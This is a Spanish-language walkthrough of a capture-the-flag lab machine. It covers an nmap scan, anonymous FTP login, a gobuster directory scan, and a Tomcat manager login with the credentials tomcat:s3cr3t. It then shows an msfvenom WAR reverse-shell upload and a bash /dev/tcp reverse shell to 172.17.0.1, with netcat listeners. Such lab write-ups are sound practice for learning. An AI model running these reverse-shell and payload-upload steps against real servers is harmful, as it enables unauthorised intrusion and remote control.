
Desplegamos el contenedor:

```Bash
bash auto_deploy.sh
```

![[Pasted image 20250203124154.png]]

Escaneamos la IP:

```Bash
nmap -sV -sC -sS -T 5 -n -Pn -p- 172.17.0.2
```

![[Pasted image 20250203124223.png]]

Nos conectamos con **FTP**:

```Bash
ftp 172.17.0.2
```

![[Pasted image 20250203124312.png]]

```Bash
anonymous
```

![[Pasted image 20250203124328.png]]

```Bash
'blank'
```

![[Pasted image 20250203124340.png]]

```Bash
ls
```

![[Pasted image 20250203124409.png]]

```Bash
get tomcat.txt
```

![[Pasted image 20250203124434.png]]

```Bash
cat tomcat.txt
```

![[Pasted image 20250203124645.png]]

Hacemos **Fuzzing**:

```Bash
gobuster dir -u http://172.17.0.2:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,py,sh,txt
```

![[Pasted image 20250204152455.png]]

Nos metemos en la web:

![[Pasted image 20250203124745.png]]

![[Pasted image 20250203125031.png]]

![[Pasted image 20250203124932.png]]

tomcat: s3cr3t

![[Pasted image 20250203125055.png]]

![[Pasted image 20250204144739.png]]

Creamos payload para subir:

```Bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o shell.war
```

![[Pasted image 20250204151401.png]]

Lo subimos:

![[Pasted image 20250204150907.png]]

![[Pasted image 20250204150933.png]]

Nos ponemos a la escucha con **netcat**:

```Bash
nc -lnvp 4444
```

![[Pasted image 20250204151015.png]]

Nos ponemos otra:

```Bash
nc -lnvp 443
```

![[Pasted image 20250204152406.png]]

Pinchamos en la shell subida:

![[Pasted image 20250204152912.png]]

Miramos en la shell:

![[Pasted image 20250204152129.png]]

Nos la mandamos a la otra shell:

```Bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

![[Pasted image 20250204152103.png]]

Miramos la otra shell:

![[Pasted image 20250204152256.png]]

```Bash
whoami
```

![[Pasted image 20250204152315.png]]